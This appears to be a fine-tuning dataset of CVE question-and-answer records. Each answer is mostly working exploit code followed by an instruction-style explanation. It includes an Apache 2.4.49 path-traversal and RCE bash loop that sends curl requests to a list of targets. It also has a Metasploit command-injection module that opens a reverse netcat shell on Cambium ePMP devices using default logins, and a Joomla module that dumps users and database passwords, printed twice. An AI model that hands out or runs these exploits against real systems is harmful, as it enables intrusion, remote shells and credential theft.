@target_uri = datastore['TARGETURI']      @traversal = pick_payload * datastore['DEPTH'] << datastore['FILEPATH']      response = read_traversal      unless response        print_error(message('No response, target seems down.'))        return Exploit::CheckCode::Unknown      end      vprint_status(\"Obtained HTTP response code #{response.code}.\")      if response.code == 500        print_warning(message(\"The target is vulnerable to #{datastore['CVE']} (mod_cgi is enabled).\"))        report_vuln(          host: target_host,          name: name,          refs: references        )      end      if response.code == 500 || response.body.empty?        print_error('Nothing was downloaded')        return Exploit::CheckCode::Vulnerable if response.code == 500      end      if response.code == 200        vprint_good(\"#{peer} \#{response.body}\")        path = store_loot(          'apache.traversal',          'application/octet-stream',          ip,          response.body,          datastore['FILEPATH']        )        print_good(\"File saved in: #{path}\")        report_vuln(          host: target_host,          name: name,          refs: references        )        return Exploit::CheckCode::Vulnerable      end      return Exploit::CheckCode::Safe    end  endendEXPLOIT: # Exploit Title: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)# Date: 11/11/2021# Exploit Author: Valentin Lobstein# Vendor Homepage: https://apache.org/# Version: Apache 2.4.49/2.4.50 (CGI enabled)# Tested on: Debian GNU/Linux# CVE : CVE-2021-41773 / CVE-2021-42013# Credits : Lucas Schnell#!/usr/bin/env python3#coding: utf-8import osimport reimport sysimport timeimport requestsfrom colorama import Fore,Styleheader = '''\\033[1;91m     \u2584\u2584\u2584       \u2588\u2588\u2593\u2588\u2588\u2588   \u2584\u2584\u2584       \u2584\u2588\u2588\u2588\u2588\u2584   \u2588\u2588\u2591 \u2588\u2588 \u2593\u2588\u2588\u2588\u2588\u2588     \u2588\u2588\u2580\u2588\u2588\u2588   \u2584\u2588\u2588\u2588\u2588\u2584  \u2593\u2588\u2588\u2588\u2588\u2588    \u2592\u2588\u2588\u2588\u2588\u2584    \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588\u2588\u2588\u2584    \u2592\u2588\u2588\u2580 \u2580\u2588  \u2593\u2588\u2588\u2591 \u2588\u2588\u2592\u2593\u2588   \u2580    \u2593\u2588\u2588 \u2592 \u2588\u2588\u2592\u2592\u2588\u2588\u2580 \u2580\u2588  \u2593\u2588   \u2580    \u2592\u2588\u2588  \u2580\u2588\u2584  \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2592\u2588\u2588  \u2580\u2588\u2584  \u2592\u2593\u2588    \u2584 \u2592\u2588\u2588\u2580\u2580\u2588\u2588\u2591\u2592\u2588\u2588\u2588      \u2593\u2588\u2588 \u2591\u2584\u2588 \u2592\u2592\u2593\u2588    \u2584 \u2592\u2588\u2588\u2588    \u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588 \u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592\u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588 \u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592\u2591\u2593\u2588 \u2591\u2588\u2588 \u2592\u2593\u2588  \u2584    \u2592\u2588\u2588\u2580\u2580\u2588\u2584  \u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592\u2592\u2593\u2588  \u2584    \u2593\u2588   \u2593\u2588\u2588\u2592\u2592\u2588\u2588\u2592 \u2591  \u2591 \u2593\u2588   \u2593\u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2588\u2580 \u2591\u2591\u2593\u2588\u2592\u2591\u2588\u2588\u2593\u2591\u2592\u2588\u2588\u2588\u2588\u2592   \u2591\u2588\u2588\u2593 \u2592\u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2588\u2580 \u2591\u2591\u2592\u2588\u2588\u2588\u2588\u2592    \u2592\u2592   \u2593\u2592\u2588\u2591\u2592\u2593\u2592\u2591 \u2591  \u2591 \u2592\u2592   \u2593\u2592\u2588\u2591\u2591 \u2591\u2592 \u2592  \u2591 \u2592 \u2591\u2591\u2592\u2591\u2592\u2591\u2591 \u2592\u2591 \u2591   \u2591 \u2592\u2593 \u2591\u2592\u2593\u2591\u2591 \u2591\u2592 \u2592  \u2591\u2591\u2591 \u2592\u2591 \u2591    \u2592   \u2592\u2592 \u2591\u2591\u2592 \u2591       \u2592   \u2592\u2592 \u2591  \u2591  \u2592    \u2592 \u2591\u2592\u2591 \u2591 \u2591 \u2591  \u2591     \u2591\u2592 \u2591 \u2592\u2591  \u2591  \u2592    \u2591 \u2591  \u2591    \u2591   \u2592   \u2591\u2591         \u2591   \u2592   \u2591         \u2591  \u2591\u2591 \u2591   \u2591        \u2591\u2591   \u2591 \u2591           \u2591''' + Style.RESET_ALLif len(sys.argv) < 2 :    print( 'Use: python3 file.py ip:port ' )    sys.exit()# Code for: def end():# Code for: def commands(url,command,session):# Code for: def mute_command(url,command):# Code for: def exploitRCE(payload):# Code for: def main():if __name__ == '__main__':    main()# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)# Date: 10/05/2021# Exploit Author: Lucas Souza https://lsass.io# Vendor Homepage:  https://apache.org/# Version: 2.4.49# Tested on: 2.4.49# CVE : CVE-2021-41773# Credits: Ash Daulton and the cPanel Security Team#!/bin/bashif [[ $1 == '' ]]; [[ $2 == '' ]]; thenecho Set [TAGET-LIST.TXT] [PATH] [COMMAND]echo ./PoC.sh targets.txt /etc/passwdexitfifor host in $(cat $1); doecho $hostcurl -s --path-as-is -d \"echo Content-Type: text/plain; echo; $3\" \"$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2\"; done# PoC.sh targets.txt /etc/passwd# PoC.sh targets.txt /bin/sh whoami       Question: CVE-2021-41773[/INST] CVE-2021-41773 is a vulnerability affecting Apache HTTP Server 2.4.49. It is a Path Traversal vulnerability that can allow an attacker to access arbitrary files on the server and potentially execute arbitrary code through specially crafted requests. This vulnerability occurs due to insufficient input validation in the handling of certain directory names during file serving.To exploit this vulnerability, an attacker can construct a malicious request containing a series of dot-dot segments (../) to navigate out of the intended directory structure and reach sensitive directories. For instance, they might try something like:```rubyhttp://example.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd```If successful, the server would return the contents of the `/etc/passwd` file, revealing sensitive information such as usernames and their corresponding password hashes. However, depending on the specific Apache installation and its configurations, an attacker might even be able to execute arbitrary code remotely.It is essential to keep Apache servers updated to protect against such vulnerabilities. Installing the latest patches provided by the vendor should prevent attacks based on CVE-2021-41773."}
{"query": "CVE-2017-5255", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Exploit::Remote  Rank = ExcellentRanking  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name' => \"Cambium ePMP1000 'get_chart' Shell via Command Injection (v3.1-3.5-RC7)\",      'Description' => %{          This module exploits an OS Command Injection vulnerability in Cambium          ePMP1000 device management portal. It requires any one of the following login          credentials - admin/admin, installer/installer, home/home - to set up a reverse          netcat shell. The module has been tested on versions 3.1-3.5-RC7.      },      'License' => MSF_LICENSE,      'Author' =>        [          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'        ],      'References' =>        [          ['CVE', '2017-5255'],          ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities']        ],      'Privileged' => true,      'Targets' =>        [          ['CMD',            {              'Arch' => ARCH_CMD,              'Platform' => 'unix'            }          ]        ],      'DisclosureDate' => '2017-12-18',      'DefaultTarget'  => 0,      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_netcat' })    )    register_options(      [        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer'])      ], self.class    )    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')  end  #  # Fingerprinting  #  def is_app_epmp1000?    begin      res = send_request_cgi(        {          'uri'       => '/',          'method'    => 'GET'        }      )    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError      print_error(\"#{rhost}:#{rport} - HTTP Connection Failed...\")      return false    end    good_response = (      res &&      res.code == 200 &&      (res.body.include?('cambium.min.css') || res.body.include?('cambiumnetworks.com') && res.body.include?('https://support.cambiumnetworks.com/files/epmp/'))    )    if good_response      get_epmp_ver = res.body.match(/\"sw_version\">([^<]*)/)      if !get_epmp_ver.nil?        epmp_ver = get_epmp_ver[1]        if !epmp_ver.nil?          print_good(\"#{rhost}:#{rport} - Running Cambium ePMP 1000 version #{epmp_ver}...\")          return true, epmp_ver        else          print_good(\"#{rhost}:#{rport} - Running Cambium ePMP 1000...\")          epmp_ver = ''          return true, epmp_ver        end      end    else      print_error(\"#{rhost}:#{rport} - Application does not appear to be Cambium ePMP 1000. The target is not vulnerable.\")      epmp_ver = nil      return false    end  end  #  # check  #  def check    success, epmp_ver = is_app_epmp1000?    if (success != 'false' && !epmp_ver.nil? && epmp_ver >= '3.1')      return CheckCode::Vulnerable    else      return CheckCode::Safe # Using 'Safe' here to imply this ver is not exploitable using the module'    end  end  #  # Login  #  def login(user, pass)    res = send_request_cgi(      {        'uri' => '/cgi-bin/luci',        'method' => 'POST',        'headers' => {          'X-Requested-With' => 'XMLHttpRequest',          'Accept' => 'application/json, text/javascript, */*; q=0.01'        },        'vars_post' =>          {            'username' => 'dashboard',            'password' => ''          }      }    )    cookies = res.get_cookies_parsed    check_sysauth = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s    good_response = (      res &&      res.code == 200 &&      check_sysauth.include?('sysauth')    )    if good_response      sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s      sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)      prevsessid = res.body.match(/((?:[a-z][a-z]*[0-9]+[a-z0-9]*))/)      res = send_request_cgi(        {          'uri' => '/cgi-bin/luci',          'method' => 'POST',          'cookie' => sysauth_value,          'headers' => {            'X-Requested-With' => 'XMLHttpRequest',            'Accept' => 'application/json, text/javascript, */*; q=0.01',            'Connection' => 'close'          },          'vars_post' =>            {              'username' => user,              'password' => pass,              'prevsess' => prevsessid            }        }      )      good_response = (        res &&        res.code == 200 &&        !res.body.include?('auth_failed')      )      if good_response        print_good(\"SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")        # check if max_user_number_reached?        if !res.body.include?('max_user_number_reached')          # get the cookie now          cookies = res.get_cookies_parsed          stok_value_dirty = res.body.match(/\"stok\": \"(.*?)\"/)          stok_value = \"#{stok_value_dirty}\".split('\"')[3]          sysauth_dirty = cookies.values.select { |v| v.to_s =~ /sysauth_/ }.first.to_s          sysauth_value = sysauth_dirty.match(/((.*)[$ ])/)          final_cookie = \"#{sysauth_value}\" + 'usernameType_80=admin; stok_80=' + \"#{stok_value}\"          # create config_uri          config_uri_get_chart = '/cgi-bin/luci/;stok=' + \"#{stok_value}\" + '/admin/get_chart'          return final_cookie, config_uri_get_chart        else          print_error('The credentials are correct but maximum number of logged-in users reached. Try again later.')          final_cookie = 'skip'          config_uri_dump_config = 'skip'          config_uri_reset_pass = 'skip'          config_uri_get_chart = 'skip'          return final_cookie, config_uri_get_chart        end      else        print_error(\"FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}\")        final_cookie = 'skip'        config_uri_get_chart = 'skip'        return final_cookie, config_uri_get_chart      end    end  end  #  # open cmd_shell  #  def cmd_shell(config_uri, cookie)    command = payload.encoded    inject = '|' + \"#{command}\"    clean_inject = CGI.unescapeHTML(inject.to_s)    print_status('Sending payload...')    res = send_request_cgi(      {        'method' => 'POST',        'uri' => config_uri,        'cookie' => cookie,        'headers' => {          'Accept' => '*/*',          'Accept-Language' => 'en-US,en;q=0.5',          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',          'X-Requested-With' => 'XMLHttpRequest',          'Connection' => 'close'        },        'vars_post' =>          {            'measure' => 's', # This parameter can also be used for injection            'timestamp' => clean_inject,            'debug' => 0          }      }, 25    )    handler  end  # exploit  def exploit    _success, epmp_ver = is_app_epmp1000?    if (epmp_ver < '3.1' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7')      print_error('This module is applicable to versions 3.1-3.5-RC7 only. Exiting now.')      return    else      cookie, config_uri_get_chart = login(datastore['USERNAME'], datastore['PASSWORD'])      if cookie == 'skip' && config_uri_get_chart == 'skip'        return      else        cmd_shell(config_uri_get_chart, cookie)      end    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::EPMP  def initialize(info = {})    super(update_info(info,      'Name' => \"Cambium ePMP 1000 'get_chart' Command Injection (v3.1-3.5-RC7)\",      'Description' => %{          This module exploits an OS Command Injection vulnerability in Cambium          ePMP 1000 (v3.1-3.5-RC7) device management portal. It requires any one of the          following login credentials - admin/admin, installer/installer, home/home - to          execute arbitrary system commands.      },      'Author' =>        [          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'        ],      'References' =>        [          ['CVE', '2017-5255'],          ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']        ],      'License' => MSF_LICENSE     )    )    register_options(      [        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer']),        OptString.new('CMD', [true, 'Command(s) to run', 'id; pwd'])      ], self.class    )    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')  end  def run_host(ip)    unless is_app_epmp1000?      return    end  end  # Command Execution  def cmd_exec(config_uri, cookie)    command = datastore['CMD']    inject = '|' + \"#{command}\"    clean_inject = CGI.unescapeHTML(inject.to_s)    print_status(\"#{rhost}:#{rport} - Executing #{command}\")    res = send_request_cgi(      {        'method' => 'POST',        'uri' => config_uri,        'cookie' => cookie,        'headers' => {          'Accept' => '*/*',          'Accept-Language' => 'en-US,en;q=0.5',          'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',          'X-Requested-With' => 'XMLHttpRequest',          'Connection' => 'close'        },        'vars_post' =>          {            'measure' => 's', # This parameter can also be used for injection            'timestamp' => clean_inject,            'debug' => 0          }      }, 25    )    good_response = (      res &&      res.code == 200    )    if good_response      path = store_loot('ePMP_cmd_exec', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 Command Exec Results')      print_status(\"#{rhost}:#{rport} - Results saved in: #{path}\")    else      print_error(\"#{rhost}:#{rport} - Failed to execute command(s).\")    end  end  #  # Login & initiate cmd_exec  #  def do_login(epmp_ver)    if (epmp_ver < '3.1' || epmp_ver > '3.5' && epmp_ver != '3.5-RC7')      print_error('This module is applicable to versions 3.1-3.5-RC7 only. Exiting now.')      return    elsif (epmp_ver >= '3.1' && epmp_ver < '3.4.1') # <3.4.1 uses login_1      cookie, _blah1, _blah2, config_uri_get_chart = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)      if cookie == 'skip' && config_uri_get_chart == 'skip'        return      else        cmd_exec(config_uri_get_chart, cookie)      end    elsif ['3.4.1', '3.5', '3.5-RC7'].include?(epmp_ver) # 3.4.1+ uses login_2      cookie, _blah1, _blah2, config_uri_get_chart = login_2(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)      if cookie == 'skip' && config_uri_get_chart == 'skip'        return      else        cmd_exec(config_uri_get_chart, cookie)      end    end  endend       Question: CVE-2017-5255[/INST] CVE-2017-5255 is a command injection vulnerability affecting the Cambium ePMP 1000 device management portal in versions 3.1-3.5-RC7. This vulnerability allows an attacker to execute arbitrary system commands by sending malicious inputs through the 'get\\_chart' endpoint. The Metasploit module provided above can be used to exploit this vulnerability by authenticating with valid credentials and sending the payload as a timestamp parameter. Once successful, the module opens a command shell and executes the specified command.In summary, CVE-2017-5255 is a critical vulnerability that enables remote attackers to gain control over the targeted system by executing arbitrary commands. It affects older versions of the Cambium ePMP 1000 device management portal and should be patched immediately."}
{"query": "CVE-2023-23752", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HTTP::Joomla  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Joomla API Improper Access Checks',        'Description' => %q{          Joomla versions between 4.0.0 and 4.2.7, inclusive, contain an improper API access vulnerability.          This vulnerability allows unauthenticated users access to webservice endpoints which contain          sensitive information. Specifically for this module we exploit the users and config/application          endpoints.          This module was tested against Joomla 4.2.7 running on Docker.        },        'License' => MSF_LICENSE,        'Author' => [          'h00die', # msf module          'Tianji Lab', # original PoC, analysis        ],        'References' => [          ['EDB', '51334'],          ['URL', 'https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html'],          ['URL', 'https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/'],          ['URL', 'https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752'],          ['CVE', '2023-23752'],        ],        'Targets' => [          ['Joomla 4.0.0 - 4.2.7', {}],        ],        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        },        'DisclosureDate' => '2023-02-01',        'DefaultTarget' => 0      )    )    # set the default port, and a URI that a user can set if the app isn't installed to the root    register_options(      [        Opt::RPORT(80),        OptString.new('TARGETURI', [true, 'The URI of the Joomla Application', '/']),      ]    )  end  def check_host(_ip)    unless joomla_and_online?      return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service or not detected as Joomla\")    end    version = joomla_version    if version.nil?      return Exploit::CheckCode::Safe(\"#{peer} - Unable to determine Joomla Version\")    end    vprint_status(\"Joomla version detected: #{version}\")    ver_no = Rex::Version.new(version)    if ver_no < Rex::Version.new('4.0.0') && ver_no >= Rex::Version.new('4.2.8')      return Exploit::CheckCode::Safe(\"Joomla version #{ver_no} is NOT vulnerable\")    end    Exploit::CheckCode::Appears(\"Joomla version #{ver_no} is vulnerable\")  end  def run_host(ip)    vprint_status('Attempting user enumeration')    res = send_request_cgi(      'uri' => normalize_uri(target_uri.path, 'api', 'index.php', 'v1', 'users'),      'headers' => {        # header is needed, it passes back JSON anyways.        'Accept' => '*/*'      },      'vars_get' => {        'public' => 'true'      }    )    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly (response code: #{res.code})\") unless res.code == 200    tbl = Rex::Text::Table.new(      'Header' => 'Joomla Users',      'Indent' => 1,      'Columns' => ['ID', 'Super User', 'Name', 'Username', 'Email', 'Send Email', 'Register Date', 'Last Visit Date', 'Group Names']    )    users = res.get_json_document    fail_with(Failure::UnexpectedReply, 'JSON document not returned') unless users # < json data wasn't properly formatted    fail_with(Failure::UnexpectedReply, \"'data' field in JSON document not found\") unless users['data'] # < json data was properly formatted by the expected key wasn't present    loot_path = store_loot('joomla.users', 'application/json', ip, res.body, 'Joomla Users')    print_good(\"Users JSON saved to #{loot_path}\")    users = users['data']    users.each do |user|      unless user['type'] == 'users'        next      end      tbl << [        user['attributes']['id'].to_s,        user['attributes']['group_names'].include?('Super Users') ? '*' : '',        user['attributes']['name'].to_s,        user['attributes']['username'].to_s,        user['attributes']['email'].to_s,        user['attributes']['sendEmail'].to_s,        user['attributes']['registerDate'].to_s,        user['attributes']['lastvisitDate'].to_s,        user['attributes']['group_names'].to_s,      ]    end    print_good(tbl.to_s)    vprint_status('Attempting config enumeration')    res = send_request_cgi(      'uri' => normalize_uri(target_uri.path, 'api', 'index.php', 'v1', 'config', 'application'),      'headers' => {        # header is needed, it passes back JSON anyways.        'Accept' => '*/*'      },      'vars_get' => {        'public' => 'true'      }    )    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly (response code: #{res.code})\") unless res.code == 200    tbl = Rex::Text::Table.new(      'Header' => 'Joomla Config',      'Indent' => 1,      'Columns' => ['Setting', 'Value']    )    config = res.get_json_document    fail_with(Failure::UnexpectedReply, 'JSON document not returned') unless config # < json data wasn't properly formatted    fail_with(Failure::UnexpectedReply, \"'data' field in JSON document not found\") unless config['data'] # < json data was properly formatted by the expected key wasn't present    loot_path = store_loot('joomla.config', 'application/json', ip, res.body, 'Joomla Config')    print_good(\"Config JSON saved to #{loot_path}\")    config = config['data']    credential_data = {      protocol: 'tcp',      workspace_id: myworkspace_id,      port: 1, # we dont get this data back so just set it to something obviously wrong instead of guessing      origin_type: :service,      private_type: :password,      module_fullname: fullname,      status: Metasploit::Model::Login::Status::UNTRIED    }    config.each do |setting|      if setting['attributes'].key?('dbtype')        credential_data[:service_name] = setting['attributes']['dbtype'].to_s        if setting['attributes']['dbtype'].to_s == ''          credential_data[:port] = '3306' # taking a guess since this info isn't returned but is required for create_credential_and_login        end        tbl << ['dbtype', setting['attributes']['dbtype'].to_s]      elsif setting['attributes'].key?('host')        credential_data[:address] = setting['attributes']['host'].to_s        tbl << ['db host', setting['attributes']['host'].to_s]      elsif setting['attributes'].key?('password')        credential_data[:private_data] = setting['attributes']['password']        tbl << ['db password', setting['attributes']['password'].to_s]      elsif setting['attributes'].key?('user')        credential_data[:username] = setting['attributes']['user'].to_s        tbl << ['db user', setting['attributes']['user'].to_s]      elsif setting['attributes'].key?('db')        tbl << ['db name', setting['attributes']['db'].to_s]      elsif setting['attributes'].key?('dbprefix')        tbl << ['db prefix', setting['attributes']['dbprefix'].to_s]      elsif setting['attributes'].key?('dbencryption')        tbl << ['db encryption', setting['attributes']['dbencryption'].to_s]      end    end    # if db host isn't a FQDN or IP, this will silently fail to save.    create_credential_and_login(credential_data)    print_good(tbl.to_s)  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HTTP::Joomla  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Joomla API Improper Access Checks',        'Description' => %q{          Joomla versions between 4.0.0 and 4.2.7, inclusive, contain an improper API access vulnerability.          This vulnerability allows unauthenticated users access to webservice endpoints which contain          sensitive information. Specifically for this module we exploit the users and config/application          endpoints.          This module was tested against Joomla 4.2.7 running on Docker.        },        'License' => MSF_LICENSE,        'Author' => [          'h00die', # msf module          'Tianji Lab', # original PoC, analysis        ],        'References' => [          ['EDB', '51334'],          ['URL', 'https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html'],          ['URL', 'https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/'],          ['URL', 'https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752'],          ['CVE', '2023-23752'],        ],        'Targets' => [          ['Joomla 4.0.0 - 4.2.7', {}],        ],        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        },        'DisclosureDate' => '2023-02-01',        'DefaultTarget' => 0      )    )    # set the default port, and a URI that a user can set if the app isn't installed to the root    register_options(      [        Opt::RPORT(80),        OptString.new('TARGETURI', [true, 'The URI of the Joomla Application', '/']),      ]    )  end  def check_host(_ip)    unless joomla_and_online?      return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service or not detected as Joomla\")    end    version = joomla_version    if version.nil?      return Exploit::CheckCode::Safe(\"#{peer} - Unable to determine Joomla Version\")    end    vprint_status(\"Joomla version detected: #{version}\")    ver_no = Rex::Version.new(version)    if ver_no < Rex::Version.new('4.0.0') && ver_no >= Rex::Version.new('4.2.8')      return Exploit::CheckCode::Safe(\"Joomla version #{ver_no} is NOT vulnerable\")    end    Exploit::CheckCode::Appears(\"Joomla version #{ver_no} is vulnerable\")  end  def run_host(ip)    vprint_status('Attempting user enumeration')    res = send_request_cgi(      'uri' => normalize_uri(target_uri.path, 'api', 'index.php', 'v1', 'users'),      'headers' => {        # header is needed, it passes back JSON anyways.        'Accept' => '*/*'      },      'vars_get' => {        'public' => 'true'      }    )    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly (response code: #{res.code})\") unless res.code == 200    tbl = Rex::Text::Table.new(      'Header' => 'Joomla Users',      'Indent' => 1,      'Columns' => ['ID', 'Super User', 'Name', 'Username', 'Email', 'Send Email', 'Register Date', 'Last Visit Date', 'Group Names']    )    users = res.get_json_document    fail_with(Failure::UnexpectedReply, 'JSON document not returned') unless users # < json data wasn't properly formatted    fail_with(Failure::UnexpectedReply, \"'data' field in JSON document not found\") unless users['data'] # < json data was properly formatted by the expected key wasn't present    loot_path = store_loot('joomla.users', 'application/json', ip, res.body, 'Joomla Users')    print_good(\"Users JSON saved to #{loot_path}\")    users = users['data']    users.each do |user|      unless user['type'] == 'users'        next      end      tbl << [        user['attributes']['id'].to_s,        user['attributes']['group_names'].include?('Super Users') ? '*' : '',        user['attributes']['name'].to_s,        user['attributes']['username'].to_s,        user['attributes']['email'].to_s,        user['attributes']['sendEmail'].to_s,        user['attributes']['registerDate'].to_s,        user['attributes']['lastvisitDate'].to_s,        user['attributes']['group_names'].to_s,      ]    end    print_good(tbl.to_s)    vprint_status('Attempting config enumeration')    res = send_request_cgi(      'uri' => normalize_uri(target_uri.path, 'api', 'index.php', 'v1', 'config', 'application'),      'headers' => {        # header is needed, it passes back JSON anyways.        'Accept' => '*/*'      },      'vars_get' => {        'public' => 'true'      }    )    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?    fail_with(Failure::UnexpectedReply, \"#{peer} - Page didn't load correctly (response code: #{res.code})\") unless res.code == 200    tbl = Rex::Text::Table.new(      'Header' => 'Joomla Config',      'Indent' => 1,      'Columns' => ['Setting', 'Value']    )    config = res.get_json_document    fail_with(Failure::UnexpectedReply, 'JSON document not returned') unless config # < json data wasn't properly formatted    fail_with(Failure::UnexpectedReply, \"'data' field in JSON document not found\") unless config['data'] # < json data was properly formatted by the expected key wasn't present    loot_path = store_loot('joomla.config', 'application/json', ip, res.body, 'Joomla Config')    print_good(\"Config JSON saved to #{loot_path}\")    config = config['data']    credential_data = {      protocol: 'tcp',      workspace_id: myworkspace_id,      port: 1, # we dont get this data back so just set it to something obviously wrong instead of guessing      origin_type: :service,      private_type: :password,      module_fullname: fullname,      status: Metasploit::Model::Login::Status::UNTRIED    }    config.each do |setting|      if setting['attributes'].key?('dbtype')        credential_data[:service_name] = setting['attributes']['dbtype'].to_s        if setting['attributes']['dbtype'].to_s == ''          credential_data[:port] = '3306' # taking a guess since this info isn't returned but is required for create_credential_and_login        end        tbl << ['dbtype', setting['attributes']['dbtype'].to_s]      elsif setting['attributes'].key?('host')        credential_data[:address] = setting['attributes']['host'].to_s        tbl << ['db host', setting['attributes']['host'].to_s]      elsif setting['attributes'].key?('password')        credential_data[:private_data] = setting['attributes']['password']        tbl << ['db password', setting['attributes']['password'].to_s]      elsif setting['attributes'].key?('user')        credential_data[:username] = setting['attributes']['user'].to_s        tbl << ['db user', setting['attributes']['user'].to_s]      elsif setting['attributes'].key?('db')        tbl << ['db name', setting['attributes']['db'].to_s]      elsif setting['attributes'].key?('dbprefix')        tbl << ['db prefix', setting['attributes']['dbprefix'].to_s]      elsif setting['attributes'].key?('dbencryption')        tbl << ['db encryption', setting['attributes']['dbencryption'].to_s]      end    end    # if db host isn't a FQDN or IP, this will silently fail to save.    create_credential_and_login(credential_data)    print_good(tbl.to_s)  endend       Question: CVE-2023-23752[/INST] CVE-2023-23752 refers to an improper access control vulnerability affecting Joomla versions between 4.0.0 and 4.2.7. This issue enables unauthenticated users to access sensitive information through webservice endpoints, specifically the 'users' and 'config/application' endpoints. An attacker can leverage this flaw to obtain user details and Joomla configurations, potentially leading to serious consequences such as account takeover or data breaches.This vulnerability was initially discovered and analyzed by Tianji Lab, and it was publicly disclosed on February 1, 2023. It affects various components of the Joomla platform, making it essential for organizations and individuals using these systems to apply the relevant patches promptly.Metasploit provides an auxiliary module named 'Joomla\\_API\\_Improper\\_Access\\_Checks' that can help identify and extract user information and configurations from vulnerable instances. By exploiting this vulnerability, an attacker can gather valuable intelligence for further attacks or even attempt privilege escalation within the targeted environment."}
